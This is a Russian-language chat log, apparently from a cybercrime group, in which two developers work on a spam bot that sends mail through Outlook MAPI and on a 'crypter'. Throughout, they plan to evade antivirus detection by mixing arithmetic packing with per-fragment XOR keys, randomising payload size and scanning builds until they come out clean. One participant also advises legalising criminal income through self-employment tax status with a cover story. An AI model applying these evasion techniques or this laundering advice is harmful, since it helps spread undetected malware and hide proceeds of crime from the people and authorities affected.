[27.07.21 17:05:16] basil:		Приветствую!
[27.07.21 17:05:27] elroy:		Приветствую
[27.07.21 17:05:57] basil:		Сегодня еще остались силы или лучше уже завтра?
[27.07.21 17:06:23] elroy:		Остались, но смотря что нужно)
[27.07.21 17:09:21] basil:		Ну собственно, что я опасался периодически , то и произошло. Перестал этот бот работать. Причем перестал очень специфически (на мой взгляд). После загрузки в 32 битный процесс писать отладночные сообщения в файл он может , а инициализировать MAPI  - у него уже не получается. Разве такое может быть, если вызов системных API работает?
[27.07.21 17:10:07] basil:		под системными API я подразумаваю например записб в файл
[27.07.21 17:10:45] elroy:		А что значит загрузки в 32х битный процесс?
[27.07.21 17:11:22] elroy:		64dll->32hollowing ?
[27.07.21 17:11:35] basil:		32->64
[27.07.21 17:12:32] elroy:		32 -> 64 должно загружаться в 64х битный процесс. Этот процесс в диспетчере задач отображаться должен не как 32х битный
[27.07.21 17:13:04] elroy:		Да, mapi может не инициализироваться поэтому. Т.е. оно определяется битность процесса и если отличается, может падать или не проходить инициализацию
[27.07.21 17:13:36] basil:		хорошо. Спасибо. Попробую по другому
[27.07.21 17:41:06] basil:		Спасибо тебе! ЖМу руку
[27.07.21 17:41:24] basil:		Извини , я целый день просидел , ничего не получается
[27.07.21 17:41:33] basil:		Наконец-то)))
[27.07.21 17:42:09] basil:		Ну и коньяк, решил себе позволить . В ктиты веки.....
[27.07.21 17:42:12] basil:		коиты*
[27.07.21 17:42:27] basil:		Заработало!
[27.07.21 17:54:11] elroy:		Так дело оказалось в коньяке? Работает?))
[27.07.21 17:54:27] basil:		ДА. Ты не поверишь!
[27.07.21 17:54:40] basil:		это какой-то трешь
[27.07.21 17:54:42] basil:		)))
[27.07.21 17:54:48] elroy:		)))
[27.07.21 17:56:01] basil:		Нет. я все равно тебе благодарен. Но коньяк чуть -чуть... Войди в мое положение....
[27.07.21 17:56:08] basil:		Пожалуйста......
[27.07.21 17:56:22] basil:		:cry:
[27.07.21 17:56:32] elroy:		Я ж не против)
[27.07.21 17:56:35] basil:		Я не алкаш
[27.07.21 17:56:44] basil:		Спасибо
[27.07.21 17:57:25] elroy:		Можно спросить, коньяк по радостному поводу или по другому?
[27.07.21 18:00:44] basil:		Можно. Повод простой - я сегодня уже все перепробовал...... Ничего не работало. То есть совсем...... Злит сволочь...... Решил тебе написать.....  Перед тем как попробовать  немножко усугубил, рюмку буквально.... И ты знаешь..... Ну наконец-то
[27.07.21 18:01:03] basil:		Извини, если был не прав....
[27.07.21 18:01:23] basil:		Но я тебе действительно боагодарен.... Хотя и несколько под шафе
[27.07.21 18:01:36] elroy:		Ясно))
[27.07.21 18:01:55] basil:		Извини, если был не прав.
[27.07.21 18:02:31] elroy:		Да нормально все)
[27.07.21 18:02:39] basil:		хорошо
[03.08.21 09:41:25] basil:		Приветствую.  Есть некоторые ньюансы в работе моей. Они касаются графика. Я сейчас неделю - 2 недели буду в сети где-то с 12,20-13,00 МСК и вечером с 17,20 до упора. Чтобы ты знал.
[03.08.21 09:42:02] elroy:		Приветствую
[03.08.21 09:42:20] elroy:		Спасибо что сообщил, но это не очень хорошо..
[03.08.21 09:42:39] elroy:		А эти две недели ты можешь уделять время работе?
[03.08.21 09:43:11] basil:		естественно.... Но просто в сеть зайти не могу
[03.08.21 09:43:39] elroy:		Я могу узнать почему?)
[03.08.21 09:44:20] basil:		безусловно
[03.08.21 09:44:25] basil:		сейчас
[03.08.21 09:45:09] basil:		слушай можно мне скинуть ссылку на сайт. Где есть одноразовые сообщения?
[03.08.21 09:45:15] basil:		которому ты доверяешь
[03.08.21 09:45:39] elroy:		Не такого сайта, я доверяю pgp
[03.08.21 09:46:24] elroy:		Ну или текстовый документ, в архив под надежный пароль, и на qaz
[03.08.21 09:46:36] basil:		хорошо. момент
[03.08.21 09:56:42] basil:		Jk6I82u#pOgikmQ8ttbDMW}r#VIVu2%tO}{IzV%L1cV9n5|kY6
[03.08.21 09:57:29] basil:		https://file.io/BzFZE8kYAPFr
[03.08.21 09:57:43] basil:		после прочтения - сожги
[03.08.21 09:57:49] elroy:		Тебе jefferson просил передать:
```
 ты можешь передать бейзилу, как он появится, чтоб при использовании сервака моего(я дал ему доступы) он обращался к fox@ для того. чтоб тот ему каждый раз подготавливал виртуалки для тестов? мне отойти нужно
этот контакт в жабе найшей, не здесь

а то бывало, чтоб я передавал кодерам свои серваки, а они потом не на виртуалках, а на смом хосте тесты проводили, что естественно, не стоит делать
```
[03.08.21 09:57:58] elroy:		Ясно, сожгу
[03.08.21 10:01:40] elroy:		сжег
[03.08.21 10:01:57] basil:		хорошо. спасибо
[03.08.21 10:02:27] elroy:		У вас там полная заслонка, ни телефоны ни модемы ни wifi ?
[03.08.21 10:04:24] basil:		если была бы возможность я бы с удовольствием. Сам вчера испугался.... Целая портянка в чате. А меня нет. Мне это слушать ну тоже не очень приятно
[03.08.21 10:04:32] basil:		а сделать пока ничего не могу
[03.08.21 10:06:34] elroy:		Нужно сообщить о таком графике silver, сегодня frances раздавал люлей
```
Ребят почему половина чата в рабочее время второй день отсутствуют? Удаленка подразумевает что вы будете работать из дома, но в нужный момент каждый должен быть на связи, тем более днем в рабочие часы. Начну проверять и штрафовать.
```
[03.08.21 10:07:16] basil:		Силвер уже вставил сегодня. Но так.... Лайт версия
[03.08.21 10:07:28] basil:		я с ним этот вопрос обсудил
[03.08.21 10:07:38] basil:		он пока кивнул головой
[03.08.21 10:07:50] elroy:		А, ну тогда хорошо
[03.08.21 10:07:59] elroy:		Тогда с работой не задерживай)
[03.08.21 10:08:08] basil:		хорошо. спасибо
[03.08.21 10:08:21] elroy:		Ждет еще заказчик другой, сегодня спрашивал что там
[03.08.21 10:08:37] elroy:		И учти насчет того что я там скинул насчет сервера от jefferson
[03.08.21 10:08:56] basil:		ок
[03.08.21 18:34:26] elroy:		На месте?
[03.08.21 18:43:09] basil:		да
[03.08.21 18:44:09] elroy:		jefferson просил сделать так, чтобы не приходилось на сервере активировать каждоо бота по одному. Если он прогружает 2 тыс. ботов - не удобно
[03.08.21 18:44:15] elroy:		martin сделал
[03.08.21 18:44:25] elroy:		Проверь пожалуйста
[03.08.21 18:44:30] elroy:		```
добавил кнопку allow work, которая разрешает всем подключенным ботам работу
```
[03.08.21 18:44:45] elroy:		Если работает, отпишись jefferson
[03.08.21 18:45:09] basil:		я за конечно.... Но только кнопки такой не наблюдаю
[03.08.21 18:45:34] elroy:		Перелогинся и нажми там ctrl+f5
[03.08.21 18:45:39] elroy:		Должен кеш скинуться
[03.08.21 18:45:45] elroy:		Поищи короче кнопку))
[03.08.21 18:45:52] basil:		хорошо
[03.08.21 19:24:10] basil:		кнопку нашли)))
[03.08.21 19:24:37] elroy:		А где была?
[03.08.21 19:24:59] elroy:		Остало проверить работает ли
[03.08.21 19:25:02] basil:		вкладка bots
[03.08.21 19:25:27] basil:		в разделе со списком ботов. Слева вверху
[03.08.21 19:25:40] elroy:		На видном месте))
[03.08.21 19:26:24] basil:		никогда бы не подумал что это кнопка..... Скорее надпись
[03.08.21 19:26:29] basil:		в рамочке
[03.08.21 19:27:21] basil:		вот еще что .... Бот заработал
[03.08.21 19:27:33] elroy:		Почему не работал?
[03.08.21 19:27:44] basil:		там несколько причин
[03.08.21 19:31:11] basil:		я пытался от главного по серверам добиться выдать мне свободный серверю Но все как-то не получалось.... Потом сделал свой, повторил то что сервер отсылает, подключался через локалхост. Все протестировал , работало. Но вот там получилось , что сервер отдает все нармально (мой самопальный сервер), а проверку авторизации бота я не делал. Вот..... И в следствии этого не заметил, как в коде закоментировал инициализацию ID бота
[03.08.21 19:31:20] basil:		Плюс
[03.08.21 19:33:44] basil:		У них там на сервере небыло ни одной учетки для Outlook. При всем желании outlook ничего не отправил бы. Я смотрю логи , одни ошибки MAPI. Ну думаю снова здравствуйте((((( Теперь еще это.... А потом решил посмотреть есть ли вообще письма в хранилище..... И вижу что ни единой учетки
[03.08.21 19:34:23] elroy:		А, ну т.е. поэтому он и завершался
[03.08.21 19:34:36] basil:		Да
[03.08.21 19:35:12] elroy:		Хорошие новости, в общем-то)
[03.08.21 19:35:33] elroy:		Рад что все работает..
[03.08.21 19:35:43] elroy:		jefferson в курсе? Отпишись ему
[03.08.21 19:35:54] basil:		Да. написал
[03.08.21 19:35:57] elroy:		И надо второму заказчику билд сделать
[03.08.21 19:37:01] basil:		Единственное там бывает , что outlook отправляет письма, а бывает что нет. Но это уже по моему от конкретной сборким офиса зависит
[03.08.21 19:37:12] basil:		Помнишь такое было?
[03.08.21 19:37:19] elroy:		Да, помню
[03.08.21 19:37:24] elroy:		Был такой косяк
[03.08.21 19:37:35] elroy:		Локализовать бы причину
[03.08.21 19:37:54] elroy:		Второй заказчик у нас с dll будет работать
[03.08.21 19:37:57] basil:		я занимаюсь уже этим
[03.08.21 19:38:04] elroy:		ок
[03.08.21 19:38:07] basil:		локуализацийей
[03.08.21 19:38:18] basil:		dll тоже сделаем
[03.08.21 19:38:27] elroy:		Еще нету?
[03.08.21 19:38:27] basil:		на АВ xbcnj
[03.08.21 19:38:29] basil:		чисто
[03.08.21 19:38:59] basil:		есть. Сделаю билд, отдам
[03.08.21 19:39:26] elroy:		Там только сервер другой и прокладки надо... Помнишь сервер?
[03.08.21 19:39:43] basil:		вот , честно говоря, нет
[03.08.21 19:39:52] elroy:		момент
[03.08.21 19:41:48] elroy:		Скажи, а ты готов выдать билд, остались только прокладки?
[03.08.21 19:42:05] elroy:		Речь про второго заказчика
[03.08.21 19:42:26] basil:		сейчас. момент
[03.08.21 19:43:17] basil:		сейчас попробую собрать
[03.08.21 19:44:53] basil:		ну dll собралась. Но я ее честно говоря не тестировал и на dyncheck не проверял
[03.08.21 19:45:36] basil:		но том все тоже самое, только dll
[03.08.21 19:46:06] elroy:		Займись этим в приоритете, а потом уже локализовывать феномен неотправки
[03.08.21 19:46:27] elroy:		Просто собрать/протестировать и отдать
[03.08.21 19:46:44] elroy:		Он сегодня писал silver`у
[03.08.21 19:46:55] basil:		хорошо
[03.08.21 19:47:34] elroy:		Сервер похоже накрылся
[03.08.21 19:48:19] elroy:		Надо будет выпустить релиз, потом уведомить его, заказать ему сервер... потом прокладки и сборка бота
[03.08.21 19:48:59] basil:		хорошо. тогда займусь dll-кой
[03.08.21 19:49:06] elroy:		ок
[03.08.21 19:49:21] elroy:		для jefferson`а все готово?
[03.08.21 19:50:10] basil:		по крайней мере пока я ошибок больше не вижу
[03.08.21 19:50:15] basil:		я его уведомил
[03.08.21 19:50:25] elroy:		Прекрасно)
[03.08.21 19:50:34] basil:		smtp тоже работает
[03.08.21 19:50:48] elroy:		Я надеюсь. Ведь оно и работало))
[04.08.21 09:44:27] basil:		Приветствую!
[04.08.21 09:44:53] elroy:		Приветствую
[04.08.21 09:46:13] basil:		Напомни, пожалуйста, что хочет второй заказчик от бота в форме DLL. Все теже самые требования только в форме DLL?
[04.08.21 09:46:23] elroy:		Да
[04.08.21 09:47:32] basil:		Хорошо. Сборку я сделал. Относительно чисто. 
https://dyncheck.com/scan/id/b8db72a2b6c2a7c500838ee027747fb5
Сегодня - завтра протестирую и будет готово.
[04.08.21 09:48:18] elroy:		Хорошо, она чистая, не относительно
[04.08.21 09:48:35] elroy:		webroot не в счет, нужно исключать из сканирования
[04.08.21 09:48:48] basil:		ок. хорошо
[09.08.21 09:22:11] elroy:		Приветствую
[09.08.21 09:22:30] basil:		Приветствую!
[09.08.21 09:22:49] elroy:		Как успехи с выпуском версии в виде dll ?
[09.08.21 09:23:42] basil:		пока работало. Я ее протестировал. все вроде нормально. При запуске экспортируемой функции отрабатывает коррекно
[09.08.21 09:23:51] basil:		кому передать dll
[09.08.21 09:23:59] basil:		это первый вопрос
[09.08.21 09:24:03] basil:		и второй
[09.08.21 09:24:57] basil:		какое имя и сигнатура должна быть у экспортируемой функции , которая запускает бота?
[09.08.21 09:25:25] basil:		потому что я пока ее просто "Start" назвал
[09.08.21 09:26:59] elroy:		Она должна быть того прототипа, что скидывал cesar.
[09.08.21 09:27:21] elroy:		Но дело в том, что он сейчас переделывает бота, я не знаю что там останется.
[09.08.21 09:27:34] elroy:		jefferson просил dll ?
[09.08.21 09:29:33] basil:		пока нет. В пятницу я еще предлагал ему совместно протестировать бота, дабы он убедился что все работает. Он сказал , что ближе к вечеру оссвободиться, но потом написал , дескать "не жди меня я сегодня еще надолго". Пытался его в выходные как-то поймать но в сети его не застал
[09.08.21 09:30:20] elroy:		Хорошо. Тут дело в том, что martin ушел в отпуск. И сервер развернуть для заказчика некому.
[09.08.21 09:30:26] elroy:		Наверное на две недели ушел
[09.08.21 09:30:35] elroy:		Такие дела
[09.08.21 09:30:59] elroy:		Я попрошу отложить пока спамбота, кроме задач jeffreson`а, если ему что-то нужно
[09.08.21 09:31:14] elroy:		Уточню что с сервером на днях.
[09.08.21 09:31:32] elroy:		Нужна доработка арифметического запаковщика
[09.08.21 09:31:39] basil:		да слушаю
[09.08.21 09:31:59] elroy:		У нас с ним проблема в том, что он крупно сильно запаковывает.
[09.08.21 09:32:11] elroy:		Так вот, есть такая мысль, запаковывать 60% файла
[09.08.21 09:32:27] elroy:		А 40% просто пускать под xor
[09.08.21 09:33:13] basil:		т.е. надо как-то разделить нагрузку и потом ее соединить. Вот эти моменты переделать
[09.08.21 09:34:17] elroy:		Но идея немного шире, нужно запаковывать случайное количество фрагментов подряд, потом делать xor с другим случайным количеством, потом опять арифметический., т.е. чередовать, но чередовать так, чтобы 60% (приблизительно) были запакованы арифметическим.
В дополнение я еще подумал, надо xor-ключик менять на каждый следующий фрагмент
[09.08.21 09:35:14] basil:		т.е необходимо иметь переменное количество фрагментов? я правильно понял?
[09.08.21 09:36:01] basil:		А как мы из потом будем размещать в кода самого криптера?
[09.08.21 09:38:20] elroy:		Точно так же как и размещаем сейчас. Да, нужно иметь переменное количество фрагментов.
Я подумал, что проще на основе класса арифметического запаковщика сделать класс с таким вот частичным запаковщиком.
Арифметический запаковщик ведь делает хранит у сеья послеовательность фрагментов, т.е.. информацию о фрагментах, так? Вот можно там и делать выборку фрагментов
[09.08.21 09:39:01] basil:		а я понял твою идею
[09.08.21 09:39:33] elroy:		Еще важно, иметь случайную последовательность фрагментов, чтобы от билда к билду отличались наборы фрагментов
[09.08.21 09:40:06] basil:		т.е. В одном буфере (блоке данных файла нагрузки) мы попеременно шифруем то xor то арифметическим компрессором. Правильно?
[09.08.21 09:40:22] elroy:		Да
[09.08.21 09:40:58] basil:		Хорошо.
[09.08.21 09:41:01] basil:		Это я понял
[09.08.21 09:42:59] basil:		размеры фрагментов , их количество и последовательность (xor-арифметическое сжатие) как-то ограничиваются или они какие-то образом дожны настраиваться?
[09.08.21 09:43:16] basil:		каким-то образом*
[09.08.21 09:44:09] elroy:		Настраиваться константами.. Это не принципиально, делай как максимально-совметимо с тем что есть сейчас в классе компрессора (чтобы меньше переделывать)
[09.08.21 09:45:09] basil:		хорошо. Я думаю это займет неделю. Может меньше. Такие сроки устраивают ?
[09.08.21 09:45:52] elroy:		Неделя - очень много. Попробуй в 3 дня уложиться.
[09.08.21 09:46:17] elroy:		Делай максимально просто, главное идею воплотить
[09.08.21 09:46:28] basil:		хорошо. сделаю.
[09.08.21 09:47:16] elroy:		По криптеру новости такие, сейчас в develop код сам по себе не генерируте рабочий криптер.
[09.08.21 09:48:04] elroy:		Чтобы сгенерировать рабочий, надо develop влить в любую ветку, например в develop_payload_generic, будет собран рабочий generic
[09.08.21 09:48:27] elroy:		Собирается UniCrypter стаб, собирается сам, ничего менять для этого не нужно
[09.08.21 09:49:24] elroy:		Просьба как всегда, сделать в отдельной ветке, на основе ветки develop, я потом волью. Просто могут быть еще изменения по функционалу
[09.08.21 09:50:10] basil:		хорошо. Еще раз. Я делаю отдельную ветку от develop и в ней работаю
[09.08.21 09:50:17] basil:		?
[09.08.21 09:50:23] basil:		не от других
[09.08.21 09:51:07] elroy:		Да, верно. Но если понадобится протестировать, вливаешь в любую ветку у себя локально и тестируешь, но такую тестовую ветку не заливай
[09.08.21 09:51:25] basil:		хорошо. теперь понял
[09.08.21 15:14:53] elroy:		На месте?
[09.08.21 15:15:17] basil:		Повтори
[09.08.21 15:15:26] basil:		тест
[09.08.21 15:15:30] basil:		вот так лучше
[09.08.21 15:15:33] basil:		повтори
[09.08.21 15:16:11] elroy:		Я спрашивал на месте ли ты. Я получил ответ)
Забыл кое что насчет доработки арифметического пакера
[09.08.21 15:16:23] basil:		да слушаю
[09.08.21 15:17:05] elroy:		Там не строго 60% нужно. Нужно чтобы в случайном порядке брался процент, диапазон от 55 - 70 %
[09.08.21 15:17:22] basil:		хорошо
[09.08.21 15:17:25] basil:		я понял
[09.08.21 15:18:14] elroy:		Ок. Это нужно чтобы один файл собрался с разными размерами)
[09.08.21 15:18:30] elroy:		Я наткнулся на то, что у нас детект зависит от размера файла нагрузки)
[09.08.21 15:18:45] basil:		Погоди
[09.08.21 15:18:48] basil:		подробнее
[09.08.21 15:18:51] basil:		это как?
[09.08.21 15:19:16] elroy:		Это похоже влияет на смещение или еще на что-то
[09.08.21 15:19:46] elroy:		Если запаковать нагрузку 70 кб и 140 у нас один файл будт с детектом, лругой - нет
[09.08.21 15:19:53] elroy:		Такой вот сюрприз
[09.08.21 15:20:01] elroy:		(это для примера)
[09.08.21 15:20:32] basil:		Может что то просто в данных светиться
[09.08.21 15:20:37] basil:		светится
[09.08.21 15:20:43] basil:		что-то
[09.08.21 15:20:49] elroy:		Точно проверено на шеллкоде. Тестовый 1кб, а мануелькриптовал 256 кб, получили в одном случае детект)
[09.08.21 15:21:28] basil:		твои пожелания я конечно сделаю. Но как то совсем странно
[09.08.21 15:21:40] elroy:		Там статика по смещению криво ложится у АВ, наверное автоматически статика ставится)
[09.08.21 15:22:09] elroy:		У нас еще шумовый код генерируется, это разбавляет размер
[09.08.21 15:22:24] elroy:		Иногда помогает просто 10 билдов сделать, и один будет точно чистый
[09.08.21 15:22:44] basil:		ну ладно. Хорошо. Сделаю
[09.08.21 15:23:07] basil:		хотя ну такого я как то совсем не ожидал
[09.08.21 15:24:32] elroy:		Вот например у ребят криптеры одинаково собирают нагрузку. Т.е. сделай 100 билдов для одной и той же нагрузки и получишь 100 файлов до 1 кб одинаковые) Вот АВ и ловят их по размеру)
[09.08.21 15:24:55] elroy:		А у нас немного получше с этим, но мало, секции имеют почти одинаковый размер))
[09.08.21 15:25:46] basil:		это случайно не вариант с использование нечетких хешей
[09.08.21 15:25:48] basil:		?
[09.08.21 15:25:57] elroy:		Вот очень похоже
[09.08.21 15:26:02] basil:		похоже с той стороны ветер дует
[09.08.21 15:26:14] elroy:		Может там нечеткий хеш на фрагмент кода, а не на всю секцию
[09.08.21 15:27:15] basil:		хорошо. учтем. и будем иметь ввиду
[09.08.21 15:28:30] elroy:		Недавно добавили фичу утренних билдов. Поутрам криптуется нагрузка и отправляется на проверку. Можеш наш криптер глянуть, держит позиции))
[09.08.21 15:28:59] basil:		там ссылка какая-то?
[09.08.21 15:29:36] elroy:		В криптопанели кнопочка Auto test сверху на панели
[09.08.21 15:29:43] basil:		момент
[09.08.21 15:32:04] basil:		да чего дошел прогресс)))
[09.08.21 15:32:27] basil:		это конечно приятно)))
[09.08.21 15:32:37] elroy:		Если бы он еще сам чистился))))
[09.08.21 15:34:39] basil:		я по этому поводу тоже думал. Можно ли как чистку атоматизировать.... Или хотя бы частично автоматизировать.... Но пока только приходили мысли о том как автоматизировать "точки" детекта.... Кодогенерацию , которая удалила бы этот детект, наверное , реализовать получиться
[09.08.21 15:34:46] basil:		получится
[09.08.21 15:35:06] basil:		может это и к лучшему .... Будет работа
[09.08.21 15:36:00] basil:		Слушай, ты говорил, что можно обратиться к тебе по производственным вопросам
[09.08.21 15:36:13] basil:		Можно сейчас обсудить? Ты в состоянии?
[09.08.21 15:37:25] elroy:		Да, конечно, можно
[09.08.21 15:38:41] basil:		Вопрос в общем-то комплексный. Его нельзя рассматривать с одной стороны... Я сейчас  напечатаю в блокноте и тебе перешлю. Что бы текст не потерялся
[09.08.21 15:39:31] elroy:		Хорошо
[09.08.21 15:57:16] basil:		тест
[09.08.21 15:57:24] elroy:		На связи
[09.08.21 15:58:29] basil:		Во первых архиватор который ты сказал сделать я , конечно, сделаю. Не вопрос. И даже думаю что в сроки уложусь. Но вот хотелось бы что обсудить... Сначала с тобой, как с "прямым начальником". Назовем твою должность так. Сейчас как ты видишь я не могу быть в сети целый день. Работать то получается, ВМ с собой взял, да и все собственно. Почему так - ты меня спрашивал. Я тебе высылал файлик с ответами на этот вопрос. Но к сожалению ситуация затягивается. Сегодня спрашивал у ребят по реальной работе. Ну когда же, ну когда же? Пытался мотивировать тем, нужно искать инфу, нужны там всякие библиотеки и так далее. Мне сказали, что халява закончилась и когда будет снова - не известно. Поэтому у меня к тебе вопрос. Можно ли мой текущий график (именно появления в сети) оставить , вот как сейчас. При условии, конечно, что работа будет сделана. Это первый вопрос. И на текущий момент он наиболее важный.
Второй вопрос. Я хочу, сменить свое официальное место работы. Официальная работа нужна. Потому что.... Ну не знаю, как у тебя , а ко мне могут быть вопросы. На что ты живешь если нигде не работаешь? Плюс налоговая может поитересоваться:"Откуда дровишки?" Поэтому я сейчас активно себе ищу новое место. Удаленный, конечно, вариант. Который позволит и в сети быть и официальное обоснование доходов иметь. Так вот. Вопрос собсвенно состоит в том, не мог ли бы ты меня проконкультировать по поводу выполнения всяких их тестовых заданий. Это конечно не панацея. Все по разному смотрят на код и так далее. Но шанс получить эту работу будет выше.
[09.08.21 16:11:03] elroy:		Все чем могу - проконсультирую. Не проблема. Но там каждый пляшет по своему, кому что хочется, те то и придумывают.
С поиском белой работы помочь не могу, как-то давно было, сам давно работал.. Понял для себя что белая работа не так уж и хороша, если ты не приносишь фирме очень хорошую отдачу.
Я предлагаю провести анализ твоего собеседования (просто в помощь). Замечания по твоему случаю с тз:
1) не все сразу работало
2) не было пояснений никаких
3) нужны /MT флаги везде в проектах
4) важен чистый разборчивый код
(поэтому было и решено поговрить, задать соответсвующие вопросы)
В разговоре никогда не проси тебя не оскорблять и прочее, относится с уважением и т.д. - это понятно и без объяснений.

Насчет налоговой и белой работы, проблема лишь в этом? Дело в том, что на сегодня существует небольшая уязвимость в законодательстве - самозанятость. Самозанятый - физическое лицо, которое платит налоги. До 2.4 млн в год. 4% налога.
1. нет проблем с переводами, можно сослаться на то, что так заплатил заказчик, кто знал что он козел, кинул крипту чурез обменник... мол, не ожидал
2. деньги после уплаты налога становятся официально заработанными
3. проверить тебя никто не может без жалобы на тебя от потребителя (коего не суествует)
4. ну конечно не вирусы с криптерами писать официально, должна быть отмазка (на всякий пожарный)
5. налоговая не требует идентифицировать физлиц-клиентов, только юрлиц, с коими работы не будет.
[09.08.21 16:12:57] elroy:		Я почему подчеркнул "физическое", ты вправе не открывать вообще дверь никому (официально) - неприкосновенность жилья.
[09.08.21 16:14:46] basil:		момент
[09.08.21 16:16:11] basil:		да по поводу налоговой - это первый момент
[09.08.21 16:19:54] basil:		Второй момент. Вот я здесь уже где-то года полтора. Если не ошибаюсь... Один раз Главный, написал , что "если на defender не чистый - эта работа не для тебя". Догадываюсь , конечно, что это просто такой профилактический пендаль, просто, что бы уж совсем не филонил , но как-то несколько страшновато. У тебя нет такоего ощущения?
[09.08.21 16:24:00] elroy:		Нет, такого ощущения нет. Так на любой работе. То место, где мне такое говорили, платило мне 3.5 к рублей / месяц. Я плюнул и свалил на рынок труда)) Тут другие зарплаты, уверен, что можешь на белом рынке предложить соответсвующую производительность? По мои наблюдениям ты не очень быстро работаешь. Я по жтому поводу тебя шантажирую поиско другой работы и т.д. потому как никто не давит, silver не требует особо.. Ну я как-то мимо пропускаю.
Обычно у кодера выработка должна быть 500 строк в день (не много и не мало), но вот за это платят 1-2 тыс баксов в месяц.
[09.08.21 16:24:53] elroy:		*Я по жтому поводу тебя НЕ шантажирую
[09.08.21 16:25:26] basil:		да. доводы логичные. справедливые
[09.08.21 16:25:53] basil:		даже не знаю, что и возразить.....
[09.08.21 16:26:35] elroy:		Насчет твоего графика, мне нужна выработка. У тебя результаты меня устраивают.
[09.08.21 16:26:55] elroy:		Ну на связи, пока не можешь быть, я не буду против, будь в обед и по вечерам
[09.08.21 16:27:04] elroy:		Возможно потом что-то изменится
[09.08.21 16:27:11] elroy:		Все бывает...
[09.08.21 16:27:45] basil:		у меня прямо жар по телу разлился... Прямо легкость какая-то
[09.08.21 16:27:48] basil:		)))
[09.08.21 16:28:57] elroy:		Ты у нас на ставку работаешь? Оклад 2к ? Я разговаривал с silver по поводу твоего полного перевода (я думал ты на пол ставки). Он не был против, я его убедил даже предложить тебе полную ставку))
[09.08.21 16:29:22] elroy:		Единственное что, инетересовала меня полная отдача. Т.е. чтобы не распылялся на две работы
[09.08.21 16:29:43] basil:		ну оклад да 2k
[09.08.21 16:29:53] basil:		Такой на текущий моментэ
[09.08.21 16:30:16] basil:		раз уж пошел такой разговор
[09.08.21 16:30:41] basil:		ты считаешь медленно делаю?
[09.08.21 16:31:39] elroy:		Ничего личного, я вижу что стараешься.. Но да, медленно. Так и раньше было, просто привыкли (я же говорю, думал ты на пол ставки).
[09.08.21 16:32:31] basil:		хорошо. доводы понятны. И справедливы. Даже возразить  нечего
[09.08.21 16:32:34] basil:		Мда...
[09.08.21 16:33:42] basil:		Хорошо. Давай тогда сделаю , что ты мне поручил. Через неделю - другую еще раз вернемся к разговору. Спасибо
[09.08.21 16:33:49] basil:		Все по делу
[09.08.21 16:34:00] elroy:		Хорошо, без проблем)
[09.08.21 16:34:08] elroy:		Насчет интернета
[09.08.21 16:34:24] elroy:		Может поискать варианты доступа к нему?
[09.08.21 16:35:46] elroy:		Не знаю как вообще бывает у некоторых, какие именно сложности. Если радиоэфир не мониторится, то можно искать хорошие варинаты через блютуз, у него есть километровый вариант. Или что-то еще беспроводное. У кого-то можно радиомост поставить (кому как везет)
[09.08.21 16:36:17] basil:		Поподробнее
[09.08.21 16:36:22] basil:		Можно?
[09.08.21 16:36:33] elroy:		Можно. А что именно?
[09.08.21 16:36:57] basil:		насчет радио вариантов.
[09.08.21 16:42:22] elroy:		Надо погуглить километровый блютуз. Нужно два устройства, один внутри, другой за пределами. Обычно блютуз канала по скорости хватит, если не тягать тяжести. - это первый вариант.
wifi - интересен двумя вещами, бывают мощные направленные и не направленные точки доступа, например к mikrotik, ubiquity, там можно в зависимости от наличия прямой видимости делать. Опять же, тут надо либо два устрйоства, либо одно, напраенное на кафешку, например, гед открытый wifi и чувствительность высокая.
У таких точек есть кроме wifi протокола еще свой. Если две одинаковые - их не видно как wifi устройства
Есть еще варианты, это мобильный интернет через модем (симкарту и вперед)
Есть спутниковые варианты, двусторонние, стоит денег конечно, там надо смотреть, у них хорошие скорости, стоит около 3-5 тыс./месяц, покрытие европа, Россия.
Есть враианты на алике разных свистков в диапазоне 2.4, их модно на мост закодить (они типа для ардуино и похожего)
[09.08.21 16:44:09] basil:		хорошо. проверю эти варианты, может что и можно сделать.... Про блютуз перый раз слышу, честно говоря....
[09.08.21 16:44:23] basil:		Но все равно спасибо за понимание.
[09.08.21 16:44:36] basil:		и разжевывание
[09.08.21 16:44:56] elroy:		На старых нокия смартфонах (которые на симбиане) была такая фиговина, релаьно 300-500 метров было, два телефона общались
[09.08.21 16:46:10] elroy:		Еще zeegbe можно посмотреть)
[09.08.21 16:46:21] basil:		хорошо. спасибо. Я понял. Совещание прошло в конструктивном ключе. Я сейчас еще буду комперссор этот переделывать. Ко мне какие-то вопросы есть?
[09.08.21 16:46:33] elroy:		Нет)
[09.08.21 16:46:57] basil:		хорошо.
[11.08.21 16:03:20] elroy:		Приветствую
[11.08.21 16:03:30] basil:		Приветсвую
[11.08.21 16:03:40] elroy:		Что-то получилось по задаче с арифметическим запаковщиком?
[11.08.21 16:05:49] basil:		да. но на текущий момент не полностью. По отдельности все это работает, а когда я пытаюсь их комбинировать , один кусок данных одним запаковщиком , а другой другим - то пока падает. В принципе я уже для одного из паковщиков ошибку поправил. Второй еще в процессе
[11.08.21 16:06:15] elroy:		Хорошо
[11.08.21 16:07:53] elroy:		Я по той проблее с интернетом еще вспомнил про LoRa, тестировал как-то. Забавная штука, скорость низкая очень, но дальность при прямой видимости до 15 км держит, пара модулей стоит 20 + 20 баксов
[11.08.21 16:08:25] basil:		хорошо. Погоди , заказчик
[11.08.21 16:09:44] basil:		оно оказывается файлы потерял
[11.08.21 16:09:45] basil:		)))
[11.08.21 16:09:48] basil:		он*
[11.08.21 16:10:23] basil:		За совет спасибо
[11.08.21 16:10:47] elroy:		А, бывает)
[11.08.21 16:31:40] basil:		хорошие новости. Заработало. Причесываю код.
[11.08.21 16:32:20] elroy:		И правда, хорошие новости)
[11.08.21 16:32:41] elroy:		Да, сделай его максимально-возможно-читабельным
[11.08.21 16:33:15] basil:		да. есть такая проблема. Сделаю все что можно
[11.08.21 16:33:24] elroy:		Итоговый размер крипта уменьшился?
[11.08.21 16:33:55] basil:		да. нет все таки. Наверное будет побольше
[11.08.21 16:34:10] basil:		да нет. Все таки*
[11.08.21 16:34:36] elroy:		Погоди, но ведь должен был уменьшится, даже в теории
[11.08.21 16:35:28] elroy:		Имею введу итоговый закриптованный файл, а не исходный код
[11.08.21 16:37:20] basil:		хорошо. давай еще раз обсудим. Задача была какая , разбить файл на несколько блоков 60 % запаковать с использованием арифметического сжатия и 40% с использованием xor. Правильно?
[11.08.21 16:37:33] elroy:		Да
[11.08.21 16:41:39] basil:		теперь смотри , на каждый блок отностится или к xor или к арифметическому сжатию. При этом каждый блок хранит в своем теле "дескриптор" (дескриптор хранит в или xor колюч или распределение частот для встречающихся символов (для арифместического сжатия)). Причем каждый блок имеет свой дескриптор
